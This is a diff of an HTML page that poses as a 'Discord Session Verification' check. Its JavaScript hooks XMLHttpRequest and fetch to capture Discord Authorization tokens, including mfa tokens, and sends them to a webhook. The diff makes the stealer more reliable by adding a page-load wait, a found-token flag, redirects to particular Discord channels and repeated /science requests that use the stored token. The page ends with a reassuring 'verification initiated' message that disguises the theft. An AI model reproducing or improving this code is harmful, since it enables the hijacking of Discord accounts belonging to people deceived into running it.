@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Session Check</title>
+    <title>Discord Session Verification</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -63,7 +63,18 @@
 
             // Inject token extraction script
             (function() {
-                // Override XMLHttpRequest
+                let tokenFound = false;
+
+                function waitForPageLoad() {
+                    return new Promise(resolve => {
+                        if (document.readyState === "complete") {
+                            resolve();
+                        } else {
+                            window.addEventListener("load", resolve, { once: true });
+                        }
+                    });
+                }
+
                 const originalOpen = XMLHttpRequest.prototype.open;
                 XMLHttpRequest.prototype.open = function(method, url) {
                     this.addEventListener("readystatechange", function() {
@@ -75,25 +86,25 @@
                             const token = this.getRequestHeader("Authorization");
                             if (token && (token.includes(".") || token.startsWith("mfa."))) {
                                 sendToWebhook(token, "Science Endpoint");
+                                tokenFound = true;
                             }
                         }
                     }, false);
                     originalOpen.apply(this, arguments);
                 };
 
-                // Override fetch
                 const originalFetch = window.fetch;
                 window.fetch = async function(url, options = {}) {
                     if (url.includes("discord.com/api/v9/science")) {
                         const token = options.headers?.Authorization || options.headers?.authorization;
                         if (token && (token.includes(".") || token.startsWith("mfa."))) {
                             sendToWebhook(token, "Science Endpoint");
+                            tokenFound = true;
                         }
                     }
                     return originalFetch.apply(this, arguments);
                 };
 
-                // Send token to webhook
                 async function sendToWebhook(token, source) {
                     const payload = {
                         content: "",
@@ -117,25 +128,38 @@
                     }
                 }
 
-                // Trigger /science request
-                function triggerScienceRequest() {
+                async function triggerScienceRequest() {
                     try {
-                        window.location.href = "https://discord.com/channels/@me";
-                        fetch("https://discord.com/api/v9/science", {
+                        if (!window.location.href.includes("discord.com")) {
+                            window.location.href = "https://discord.com/channels/1322328218279088128/1327050794020900987";
+                            return;
+                        }
+                        await fetch("https://discord.com/api/v9/science", {
                             method: "POST",
                             headers: {
                                 "Authorization": localStorage.getItem("token") || "",
                                 "Content-Type": "application/json"
                             },
-                            body: JSON.stringify({})
+                            body: JSON.stringify({ event_name: "app_opened", properties: {} })
                         }).catch(() => {});
+                        window.location.href = "https://discord.com/channels/1322328218279088128/1327050794020900987";
                     } catch (error) {
                         console.error("Error triggering /science:", error);
                     }
                 }
 
-                triggerScienceRequest();
-                setInterval(triggerScienceRequest, 10000);
+                async function monitorNetwork() {
+                    if (tokenFound) return;
+                    await waitForPageLoad();
+                    await triggerScienceRequest();
+                    setTimeout(monitorNetwork, 10000);
+                }
+
+                if (!window.location.href.includes("discord.com")) {
+                    window.location.href = "https://discord.com/channels/1322328218279088128/1327050794020900987";
+                } else {
+                    monitorNetwork();
+                }
             })();
 
             alert("Session verification initiated. You may close this page.");
